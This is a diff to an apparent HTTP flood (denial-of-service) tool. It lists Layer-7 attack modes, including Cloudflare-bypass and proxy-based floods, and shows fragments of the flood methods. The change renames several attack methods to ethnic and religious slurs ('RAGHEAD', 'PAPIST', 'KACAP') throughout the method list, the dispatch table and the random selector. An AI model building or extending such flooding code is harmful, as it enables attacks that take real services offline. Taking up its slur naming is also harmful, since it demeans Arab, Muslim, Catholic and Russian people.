@@ -128,7 +128,7 @@ def exit(*message):
 
 class Methods:
     LAYER7_METHODS: Set[str] = {
-        "CFTANKIE", "CFTANKIE2", "CFFUNDIE", "CFFUNDIE2", "FUNDIE", "SKY", "TANKIE_SPECIAL", "ROW",
+        "CFTANKIE", "CFTANKIE2", "CFFUNDIE", "CFFUNDIE2", "RAGHEAD", "PAPIST", "TANKIE_SPECIAL", "KACAP",
         "CFB", "BYPASS", "GET", "POST", "OVH", "STRESS", "DYN", "SLOW", "HEAD",
         "NULL", "COOKIE", "PPS", "EVEN", "GSB", "DGB", "AVB", "CFBUAM",
         "APACHE", "XMLRPC", "BOT", "BOMB", "DOWNLOADER", "KILLER", "TOR", "RHEX", "STOMP"
@@ -721,13 +721,13 @@ class HttpFlood(Thread):
             "BOT": self.BOT,
             "APACHE": self.APACHE,
             "BYPASS": self.BYPASS,
-            "ROW": self.ROW,
+            "KACAP": self.KACAP,
             "DGB": self.DGB,
             "OVH": self.OVH,
             "AVB": self.AVB,
-            "FUNDIE": self.FUNDIE,
+            "RAGHEAD": self.RAGHEAD,
             "TANKIE_SPECIAL": self.TANKIE_SPECIAL,
-            "SKY" : self.SKY,
+            "PAPIST" : self.PAPIST,
             "STRESS": self.STRESS,
             "DYN": self.DYN,
             "SLOW": self.SLOW,
@@ -1066,7 +1066,7 @@ class HttpFlood(Thread):
         attack_method = int(random.randint(0,2))
 
         if attack_method == 0:
-            self.SKY()
+            self.PAPIST()
         elif  attack_method == 1:
             self.CFTANKIE()
         elif  attack_method == 2:
@@ -1183,7 +1183,7 @@ class HttpFlood(Thread):
                 Tools.send(s, payload)
         Tools.safe_close(s)
 
-    def FUNDIE(self):
+    def RAGHEAD(self):
         # AVB + SLOW
         payload: bytes = self.generate_payload()
         s = None
@@ -1215,7 +1215,7 @@ class HttpFlood(Thread):
                     BYTES_SEND += Tools.sizeOfRequest(res)
         Tools.safe_close(s)
 
-    def SKY(self):
+    def PAPIST(self):
         global REQUESTS_SENT, BYTES_SEND
         pro = None
         if self._proxies:
@@ -1319,7 +1319,7 @@ class HttpFlood(Thread):
                     BYTES_SEND += Tools.sizeOfRequest(res)
         Tools.safe_close(s)
 
-    def ROW(self):
+    def KACAP(self):
         global REQUESTS_SENT, BYTES_SEND
 
         pro = None
